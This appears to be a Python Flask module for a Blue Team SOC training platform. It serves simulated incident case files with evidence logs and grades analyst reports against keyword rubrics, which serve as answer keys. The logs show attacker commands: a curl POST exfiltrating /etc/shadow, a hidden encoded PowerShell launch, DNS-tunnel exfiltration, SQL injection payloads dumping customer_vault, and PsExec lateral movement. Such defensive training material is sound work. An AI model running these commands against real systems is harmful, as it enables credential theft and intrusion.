"""
casefiles.py -- Blue Team SOC Incident Case Files Blueprint (E-02)

Provides:
  - GET  /api/casefiles              -> List of forensic investigation cases & completion status
  - GET  /api/casefiles/<case_id>    -> Full case details, scenario, evidence logs, rubric
  - POST /api/casefiles/<case_id>/submit -> Submit analyst investigation report, get Socratic evaluation & score

Integrates with:
  - INCIDENT_TAXONOMY in vuln_taxonomy.py
  - Skill Ledger (records Blue Team incident verification)
  - Tracks (powers the SOC Analyst track progress)
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
from typing import Any

from flask import Blueprint, jsonify, request
from flask_login import current_user, login_required

try:
    from db.connection import _get_db
except ImportError:
    from backend.db.connection import _get_db

try:
    from vuln_taxonomy import INCIDENT_TAXONOMY
except ImportError:
    from backend.vuln_taxonomy import INCIDENT_TAXONOMY

try:
    from database import record_skill_progress
except ImportError:
    from backend.database import record_skill_progress

casefiles_bp = Blueprint("casefiles", __name__, url_prefix="/api/casefiles")


def _ensure_casefile_table():
    """Ensure casefile_submissions table exists."""
    db = _get_db()
    try:
        db.execute("""
            CREATE TABLE IF NOT EXISTS casefile_submissions (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id      INTEGER NOT NULL,
                case_id      TEXT    NOT NULL,
                score        INTEGER NOT NULL,
                passed       INTEGER NOT NULL DEFAULT 0,
                feedback     TEXT,
                submission   TEXT,
                completed_at TEXT    NOT NULL
            );
        """)
        db.execute("CREATE INDEX IF NOT EXISTS idx_casefile_user_case ON casefile_submissions (user_id, case_id);")
        db.commit()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Case Files Catalog
# ---------------------------------------------------------------------------
_CASE_FILES: list[dict[str, Any]] = [
    {
        "id": "case-01-brute-ssh",
        "title_en": "The Midnight Brute Force Storm",
        "title_ar": "عاصفة كسر كلمات المرور الليلية",
        "incident_type": "brute_force",
        "severity": "high",
        "mitre_id": "T1110.001",
        "mitre_tactic": "Credential Access",
        "target_system": "bastion.prod.internal (192.168.10.5)",
        "scenario_en": (
            "SOC monitoring flagged 15,000+ failed SSH connection events within 10 minutes on production "
            "bastion host. Analyze the authentications log, pinpoint the threat actor's IP, determine "
            "if any account was compromised, and identify post-exploitation commands."
        ),
        "scenario_ar": (
            "رصد نظام مراقبة المركز الأمني أكثر من 15,000 محاولة دخول فاشلة عبر SSH خلال 10 دقائق على خادم "
            "التحكم الرئيسي. حلل سجلات المصادقة auth.log وحدد عنوان المهاجم، وهل تم اختراق حساب، وما هي الأوامر المنفذة."
        ),
        "evidence_logs": [
            "Sep 10 03:10:01 bastion sshd[14201]: Failed password for invalid user admin from 198.51.100.42 port 43101 ssh2",
            "Sep 10 03:10:02 bastion sshd[14204]: Failed password for invalid user root from 198.51.100.42 port 43102 ssh2",
            "Sep 10 03:10:04 bastion sshd[14209]: Failed password for invalid user ubuntu from 198.51.100.42 port 43105 ssh2",
            "Sep 10 03:10:05 bastion sshd[14212]: Failed password for invalid user oracle from 198.51.100.42 port 43108 ssh2",
            "Sep 10 03:10:07 bastion sshd[14215]: Failed password for invalid user test from 198.51.100.42 port 43110 ssh2",
            "Sep 10 03:12:40 bastion sshd[14890]: Failed password for deploy from 198.51.100.42 port 44199 ssh2",
            "Sep 10 03:12:45 bastion sshd[14895]: Failed password for deploy from 198.51.100.42 port 44203 ssh2",
            "Sep 10 03:14:22 bastion sshd[15002]: Accepted password for deploy from 198.51.100.42 port 44211 ssh2",
            "Sep 10 03:14:23 bastion systemd-logind[612]: New session 49 of user deploy.",
            "Sep 10 03:14:55 bastion sudo[15088]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow",
            "Sep 10 03:15:10 bastion sudo[15104]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -X POST http://198.51.100.42/exfil --data-binary @/etc/shadow",
            "Sep 10 03:15:40 bastion sshd[15002]: Received disconnect from 198.51.100.42 port 44211:11: disconnected by user",
        ],
        "rubric": {
            "attacker_ip": ["198.51.100.42"],
            "compromised_account": ["deploy"],
            "mitre_keywords": ["t1110", "brute", "password", "spray", "credential access"],
            "impact_keywords": ["shadow", "sudo", "exfil", "root", "hash", "cat /etc/shadow"],
            "containment_keywords": ["block", "firewall", "reset", "mfa", "isolate", "rotate", "disable password"],
        },
    },
    {
        "id": "case-02-phishing-exfil",
        "title_en": "The Weaponized Invoice & DNS Beacon",
        "title_ar": "فاتورة الاحتيال والاتصال الخفي",
        "incident_type": "phishing",
        "severity": "critical",
        "mitre_id": "T1566.001",
        "mitre_tactic": "Initial Access",
        "target_system": "FIN-WS-09 (10.0.4.22) / sarah.finance",
        "scenario_en": (
            "An employee reported unexpected browser popups after downloading an email attachment. "
            "Network perimeter logs reveal regular 60-second DNS requests containing high-entropy subdomains. "
            "Inspect mail gateway and DNS logs to trace the root intrusion and C2 domain."
        ),
        "scenario_ar": (
            "أبلغ موظف عن نوافذ منبثقة غريبة بعد فتح مرفق بريد إلكتروني. تظهر سجلات محيط الشبكة طلبات DNS متكررة "
            "كل 60 ثانية تحتوي على نطاقات فرعية مشفرة. افحص سجلات البريد والـ DNS لتحديد خادم المهاجم والمصدر."
        ),
        "evidence_logs": [
            "2026-09-08 09:15:10 mailgw[902]: INBOUND from <billing-update@global-supplier-corp.net> to <sarah.finance@corp.internal>",
            "2026-09-08 09:15:11 mailgw[902]: Attachment: Invoice_Q3_Urgent.pdf.exe | SHA256: d41d8cd98f00b204e9800998ecf8427e",
            "2026-09-08 09:18:22 endpoint-edr[410]: FIN-WS-09 (10.0.4.22): Process executed: Invoice_Q3_Urgent.pdf.exe (PID: 3820)",
            "2026-09-08 09:18:23 endpoint-edr[410]: Process 3820 spawned powershell.exe -NonI -W Hidden -Enc JABjAGwAaQ...",
            "2026-09-08 09:19:00 dns-resolver[102]: Client 10.0.4.22 query: A a1b2c3d4.c2-sync-analytics.xyz -> NXDOMAIN",
            "2026-09-08 09:20:00 dns-resolver[102]: Client 10.0.4.22 query: TXT beacon-ack.c2-sync-analytics.xyz -> TXT 'OK_EXEC'",
            "2026-09-08 09:21:00 dns-resolver[102]: Client 10.0.4.22 query: TXT exfil-part1-dXNlcm5hbWU=.c2-sync-analytics.xyz -> TXT 'RECEIVED'",
            "2026-09-08 09:22:00 dns-resolver[102]: Client 10.0.4.22 query: TXT exfil-part2-cGFzc3dk.c2-sync-analytics.xyz -> TXT 'RECEIVED'",
        ],
        "rubric": {
            "attacker_ip": ["c2-sync-analytics.xyz", "global-supplier-corp.net"],
            "compromised_account": ["sarah.finance", "fin-ws-09", "10.0.4.22"],
            "mitre_keywords": ["t1566", "t1071", "phishing", "beacon", "dns", "tunneling", "c2"],
            "impact_keywords": ["powershell", "exfil", "executable", "invoice", "c2-sync-analytics", "txt"],
            "containment_keywords": ["isolate", "sinkhole", "block", "edr", "quarantine", "revoke", "reset"],
        },
    },
    {
        "id": "case-03-web-sqli-dump",
        "title_en": "Nighttime Database Extraction",
        "title_ar": "استخراج وتسريب البيانات ليلاً",
        "incident_type": "data_exfil",
        "severity": "critical",
        "mitre_id": "T1190",
        "mitre_tactic": "Initial Access & Exfiltration",
        "target_system": "api-gateway.corp.com (172.16.0.12)",
        "scenario_en": (
            "Database administrators flagged an unusual spike in table reads during off-hours on customer_vault. "
            "Examine web server access logs and database audit logs to confirm SQL injection and data exfiltration."
        ),
        "scenario_ar": (
            "لاحظ مسؤولو قواعد البيانات قراءة غير معتادة لآلاف السجلات خارج أوقات العمل من جدول customer_vault. "
            "افحص سجلات خادم الويب وقاعدة البيانات لتأكيد استغلال حقن SQL وسحب البيانات الحساسة."
        ),
        "evidence_logs": [
            "2026-09-07 02:40:11 nginx-access: 203.0.113.88 - - [07/Sep/2026:02:40:11 +0000] \"GET /api/catalog/item?id=1' HTTP/1.1\" 500 482",
            "2026-09-07 02:40:25 nginx-access: 203.0.113.88 - - [07/Sep/2026:02:40:25 +0000] \"GET /api/catalog/item?id=1'-- HTTP/1.1\" 200 1250",
            "2026-09-07 02:41:02 nginx-access: 203.0.113.88 - - [07/Sep/2026:02:41:02 +0000] \"GET /api/catalog/item?id=1%20UNION%20SELECT%20null,schema_name,3,4%20FROM%20information_schema.schemata-- HTTP/1.1\" 200 3410",
            "2026-09-07 02:43:18 nginx-access: 203.0.113.88 - - [07/Sep/2026:02:43:18 +0000] \"GET /api/catalog/item?id=1%20UNION%20SELECT%20null,concat(username,':',password_hash,':',card_num),3,4%20FROM%20customer_vault-- HTTP/1.1\" 200 4892104",
            "2026-09-07 02:43:19 mysql-audit: user=webapp_prod query='SELECT id, name, price, desc FROM catalog WHERE id=1 UNION SELECT null,concat(username,':',password_hash,':',card_num),3,4 FROM customer_vault--' rows=45000 duration=1.42s",
        ],
        "rubric": {
            "attacker_ip": ["203.0.113.88"],
            "compromised_account": ["webapp_prod", "customer_vault", "/api/catalog/item"],
            "mitre_keywords": ["t1190", "t1041", "sqli", "sql injection", "union", "exfiltration"],
            "impact_keywords": ["customer_vault", "card_num", "password_hash", "45000", "4.8mb", "dump"],
            "containment_keywords": ["parameterized", "prepare", "block", "waf", "rotate", "dpo", "patch"],
        },
    },
    {
        "id": "case-04-lateral-movement",
        "title_en": "The Ghost in the Internal Subnet",
        "title_ar": "التحرك الجانبي في الشبكة الداخلية",
        "incident_type": "lateral_movement",
        "severity": "high",
        "mitre_id": "T1021.002",
        "mitre_tactic": "Lateral Movement",
        "target_system": "DEV-STATION-04 (10.0.1.15) -> FILE-SRV (10.0.1.200)",
        "scenario_en": (
            "Network IDS alerted on anomalous SMB connections originating from developer machine DEV-STATION-04 "
            "targeting FILE-SRV at 02:00 AM. Triage NetFlow records and Windows security events to uncover lateral spread."
        ),
        "scenario_ar": (
            "أطلق نظام اكتشاف التسلل تنبيهاً على اتصالات SMB غير متوقعة قادمة من محطة تطوير نحو خادم الملفات "
            "في الساعة الثانية ليلاً. تتبع سجلات NetFlow وWindows Security للتحقق من التحرك الجانبي."
        ),
        "evidence_logs": [
            "2026-09-06 02:18:00 netflow: SRC=10.0.1.15 DST=10.0.1.200 PROTO=TCP DPT=445 BYTES=14820 PACKETS=88",
            "2026-09-06 02:18:05 win-event: Host FILE-SRV EventID 4624 (Successful Logon) Type=3 (Network) Account=svc_backup Workstation=DEV-STATION-04",
            "2026-09-06 02:18:40 win-event: Host FILE-SRV EventID 7045 (Service Created) ServiceName=PSEXESVC Path=%SystemRoot%\\PSEXESVC.exe",
            "2026-09-06 02:19:10 win-event: Host FILE-SRV EventID 4688 (Process Created) Creator=PSEXESVC.exe NewProcess=cmd.exe /c whoami",
            "2026-09-06 02:20:00 win-event: Host FILE-SRV EventID 4688 (Process Created) Creator=cmd.exe NewProcess=net group \"Domain Admins\" /domain",
        ],
        "rubric": {
            "attacker_ip": ["10.0.1.15", "dev-station-04"],
            "compromised_account": ["svc_backup", "file-srv", "10.0.1.200"],
            "mitre_keywords": ["t1021", "smb", "lateral movement", "psexec", "pass-the-hash"],
            "impact_keywords": ["psexesvc", "domain admins", "whoami", "service created", "eventid 7045"],
            "containment_keywords": ["isolate", "reset", "svc_backup", "block 445", "segment", "terminate"],
        },
    },
]

_CASE_INDEX: dict[str, dict[str, Any]] = {c["id"]: c for c in _CASE_FILES}


# ---------------------------------------------------------------------------
# Socratic Evaluation Engine
# ---------------------------------------------------------------------------
def _evaluate_submission(case: dict[str, Any], payload: dict[str, Any]) -> tuple[int, bool, dict[str, Any]]:
    """
    Evaluate user investigation submission against case rubric.
    Returns: (score, passed, feedback_dict)
    """
    rubric = case.get("rubric", {})
    sub_ip = str(payload.get("attacker_source", "")).strip().lower()
    sub_mitre = str(payload.get("mitre_technique", "")).strip().lower()
    sub_account = str(payload.get("compromised_target", "")).strip().lower()
    sub_impact = str(payload.get("findings_narrative", "")).strip().lower()
    sub_remed = str(payload.get("containment_plan", "")).strip().lower()

    score = 0
    checks = {}

    # Check 1: Attacker Source / IP (25 points)
    ip_matches = any(k in sub_ip or k in sub_impact for k in rubric.get("attacker_ip", []))
    if ip_matches:
        score += 25
        checks["attacker_source"] = {"status": "pass", "msg": "Correct threat actor IP / source identified."}
    else:
        checks["attacker_source"] = {"status": "fail", "msg": f"Threat actor source incorrect. Check evidence logs carefully."}

    # Check 2: Compromised Account / Host (20 points)
    acc_matches = any(k in sub_account or k in sub_impact for k in rubric.get("compromised_account", []))
    if acc_matches:
        score += 20
        checks["compromised_target"] = {"status": "pass", "msg": "Compromised asset or user correctly identified."}
    else:
        checks["compromised_target"] = {"status": "fail", "msg": "The breached account or affected host was not identified accurately."}

    # Check 3: MITRE ATT&CK Classification (20 points)
    mitre_matches = any(k in sub_mitre or k in sub_impact for k in rubric.get("mitre_keywords", []))
    if mitre_matches:
        score += 20
        checks["mitre_tactic"] = {"status": "pass", "msg": "MITRE ATT&CK tactic/technique accurately mapped."}
    else:
        checks["mitre_tactic"] = {"status": "fail", "msg": "Review MITRE framework for this attack type."}

    # Check 4: Root Cause & Impact Analysis (20 points)
    impact_matches = sum(1 for k in rubric.get("impact_keywords", []) if k in sub_impact)
    if impact_matches >= 1:
        score += 20
        checks["impact_analysis"] = {"status": "pass", "msg": "Root cause and impact demonstrated with log evidence."}
    else:
        checks["impact_analysis"] = {"status": "fail", "msg": "Provide more concrete evidence from the log traces (e.g. files accessed, commands run)."}

    # Check 5: Containment & Remediation (15 points)
    remed_matches = sum(1 for k in rubric.get("containment_keywords", []) if k in sub_remed or k in sub_impact)
    if remed_matches >= 1:
        score += 15
        checks["containment"] = {"status": "pass", "msg": "Sound containment and mitigation actions proposed."}
    else:
        checks["containment"] = {"status": "fail", "msg": "Include concrete incident response actions (e.g. firewall blocking, credential rotation, isolation)."}

    passed = score >= 65

    feedback = {
        "score": score,
        "passed": passed,
        "checks": checks,
        "socratic_debrief": (
            "Excellent forensic triage! You successfully traced the incident lifecycle from initial access to root cause."
            if passed else
            "Investigation incomplete. Re-examine the provided log traces, pay close attention to exact IP addresses, commands executed, and propose clear containment actions."
        ),
    }

    return score, passed, feedback


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@casefiles_bp.route("", methods=["GET"])
@login_required
def list_casefiles():
    """GET /api/casefiles -- List all SOC cases with user submission status."""
    _ensure_casefile_table()
    user_id = int(current_user.get_id())

    db = _get_db()
    rows = db.execute(
        "SELECT case_id, score, passed, completed_at FROM casefile_submissions WHERE user_id = ?",
        (user_id,)
    ).fetchall()

    status_map = {}
    for r in rows:
        cid = r[0]
        # Keep best score if submitted multiple times
        if cid not in status_map or r[2] > status_map[cid]["passed"]:
            status_map[cid] = {
                "score": r[1],
                "passed": bool(r[2]),
                "completed_at": r[3],
            }

    result = []
    for c in _CASE_FILES:
        stat = status_map.get(c["id"], {"score": 0, "passed": False, "completed_at": None})
        tax_info = INCIDENT_TAXONOMY.get(c["incident_type"], {})
        result.append({
            "id": c["id"],
            "title_en": c["title_en"],
            "title_ar": c["title_ar"],
            "incident_type": c["incident_type"],
            "incident_name_en": tax_info.get("name_en", c["incident_type"]),
            "incident_name_ar": tax_info.get("name_ar", c["incident_type"]),
            "severity": c["severity"],
            "mitre_id": c["mitre_id"],
            "mitre_tactic": c["mitre_tactic"],
            "target_system": c["target_system"],
            "scenario_en": c["scenario_en"],
            "scenario_ar": c["scenario_ar"],
            "status": stat,
        })

    return jsonify({"ok": True, "cases": result})


@casefiles_bp.route("/<case_id>", methods=["GET"])
@login_required
def get_casefile(case_id: str):
    """GET /api/casefiles/<id> -- Retrieve case details, scenario, and evidence log snippet."""
    case = _CASE_INDEX.get(case_id)
    if not case:
        return jsonify({"ok": False, "error": f"Case file '{case_id}' not found."}), 404

    _ensure_casefile_table()
    user_id = int(current_user.get_id())
    db = _get_db()
    row = db.execute(
        "SELECT score, passed, feedback, completed_at FROM casefile_submissions WHERE user_id = ? AND case_id = ? ORDER BY id DESC LIMIT 1",
        (user_id, case_id)
    ).fetchone()

    prev_sub = None
    if row:
        prev_sub = {
            "score": row[0],
            "passed": bool(row[1]),
            "feedback": json.loads(row[2]) if row[2] else {},
            "completed_at": row[3],
        }

    tax_info = INCIDENT_TAXONOMY.get(case["incident_type"], {})

    return jsonify({
        "ok": True,
        "case": {
            "id": case["id"],
            "title_en": case["title_en"],
            "title_ar": case["title_ar"],
            "incident_type": case["incident_type"],
            "incident_name_en": tax_info.get("name_en", case["incident_type"]),
            "incident_name_ar": tax_info.get("name_ar", case["incident_type"]),
            "severity": case["severity"],
            "mitre_id": case["mitre_id"],
            "mitre_tactic": case["mitre_tactic"],
            "target_system": case["target_system"],
            "scenario_en": case["scenario_en"],
            "scenario_ar": case["scenario_ar"],
            "evidence_logs": case["evidence_logs"],
            "log_sources": tax_info.get("log_sources", []),
            "remediation_guidance": tax_info.get("remediation_en", ""),
            "previous_submission": prev_sub,
        }
    })


@casefiles_bp.route("/<case_id>/submit", methods=["POST"])
@login_required
def submit_casefile(case_id: str):
    """
    POST /api/casefiles/<id>/submit
    Receives analyst investigation findings and provides Socratic evaluation.
    """
    case = _CASE_INDEX.get(case_id)
    if not case:
        return jsonify({"ok": False, "error": f"Case file '{case_id}' not found."}), 404

    payload = request.get_json() or {}
    score, passed, feedback = _evaluate_submission(case, payload)

    user_id = int(current_user.get_id())
    _ensure_casefile_table()
    now_str = datetime.now(timezone.utc).isoformat()

    db = _get_db()
    db.execute(
        """
        INSERT INTO casefile_submissions (user_id, case_id, score, passed, feedback, submission, completed_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
        (user_id, case_id, score, 1 if passed else 0, json.dumps(feedback), json.dumps(payload), now_str)
    )
    db.commit()

    # If passed, record progress in user skill ledger for this incident type!
    if passed:
        try:
            record_skill_progress(user_id, case["incident_type"], "practiced_verified")
        except Exception:
            pass

    return jsonify({
        "ok": True,
        "score": score,
        "passed": passed,
        "feedback": feedback,
    })
